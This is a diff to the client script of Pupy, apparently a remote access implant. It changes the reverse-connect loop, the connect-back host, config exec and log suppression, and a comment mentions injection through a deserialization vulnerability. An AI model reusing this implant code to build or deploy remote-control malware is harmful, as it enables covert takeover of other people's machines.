@@ -50,11 +50,10 @@ except ImportError:
 except Exception as e:
     logging.warning(e)
 
-if sys.platform=="win32" and hasattr(sys, 'frozen') and sys.frozen:
+if hasattr(sys, 'frozen') and sys.frozen:
     logging.disable(logging.CRITICAL) # disable all logging, because it can injected pupy dll unresponsive
 else:
     logging.getLogger().setLevel(logging.ERROR)
-
 
 def add_pseudo_pupy_module():
     """ add a pseudo pupy module for *nix payloads """
@@ -70,6 +69,10 @@ try:
 except ImportError:
     if "pupy" not in sys.modules:
         add_pseudo_pupy_module()
+
+if "pupy" not in sys.modules:
+    add_pseudo_pupy_module()
+
 import pupy
 pupy.infos={} #global dictionary to store informations persistent through a deconnection
 
@@ -151,8 +154,6 @@ def get_next_wait(attempt):
     else:
         return random.randint(150,300)/10.0
 
-
-
 def set_connect_back_host(HOST):
     import pupy
     pupy.get_connect_back_host=(lambda: HOST)
@@ -178,7 +179,7 @@ def main():
     if not LAUNCHER in conf.launchers:
         exit("No such launcher: %s"%LAUNCHER)
 
-    if "windows" in platform.system().lower():
+    if 'get_pupy_config' in pupy.__dict__:
         try:
             config_file=pupy.get_pupy_config()
             exec config_file in globals()
@@ -217,17 +218,13 @@ def rpyc_loop(launcher):
                     s.start()
                 else: # connect payload
                     stream=ret
-                    def check_timeout(event, cb, timeout=10):
-                        start_time=time.time()
-                        while True:
-                            if time.time()-start_time>timeout:
-                                if not event.is_set():
-                                    logging.error("timeout occured !")
-                                    cb()
-                                break
-                            elif event.is_set():
-                                break
-                            time.sleep(0.5)
+
+                    def check_timeout(event, cb, timeout=60):
+                        time.sleep(timeout)
+                        if not event.is_set():
+                            logging.error("timeout occured !")
+                            cb()
+
                     event=threading.Event()
                     t=threading.Thread(target=check_timeout, args=(event, stream.close))
                     t.daemon=True
@@ -236,9 +233,8 @@ def rpyc_loop(launcher):
                         conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
                     finally:
                         event.set()
-                    while not stream.closed:
-                        attempt=0
-                        conn.serve(0.01)
+                    attempt=0
+                    conn.serve_all()
             except KeyboardInterrupt:
                 raise
             except EOFError:
@@ -260,7 +256,6 @@ def rpyc_loop(launcher):
         return
 
 if __name__=="__main__":
-
     main()
 else:
     t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
